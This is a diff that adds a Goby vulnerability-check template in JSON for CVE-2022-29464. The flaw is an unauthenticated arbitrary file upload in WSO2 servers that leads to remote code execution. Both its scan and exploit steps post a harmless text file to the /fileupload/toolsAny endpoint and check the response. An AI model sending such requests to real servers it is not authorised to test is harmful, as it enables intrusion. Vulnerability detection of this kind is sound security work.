@@ -1,0 +1,103 @@
+{
+      "Name": "WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464",
+      "Level": "3",
+      "Tags": [
+            "getshell"
+      ],
+      "GobyQuery": "app=\"WSO2-Carbon-Server\"",
+      "Description": "CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/fileupload/toolsAny",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0"
+                        },
+                        "data_type": "text",
+                        "data": "--4ef9f369a86bfaadf5ec3177278d49c0\r\nContent-Disposition: form-data; name=\"1.txt\"; filename=\"1.txt\"\r\n\r\n123\r\n--4ef9f369a86bfaadf5ec3177278d49c0--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "regex",
+                                    "value": "[0-9]+",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/fileupload/toolsAny",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0"
+                        },
+                        "data_type": "text",
+                        "data": "--4ef9f369a86bfaadf5ec3177278d49c0\r\nContent-Disposition: form-data; name=\"1.txt\"; filename=\"1.txt\"\r\n\r\n123\r\n--4ef9f369a86bfaadf5ec3177278d49c0--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "regex",
+                                    "value": "[0-9]+",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2022-05-28 17:38:42",
+      "GobyVersion": "1.9.325"
+}
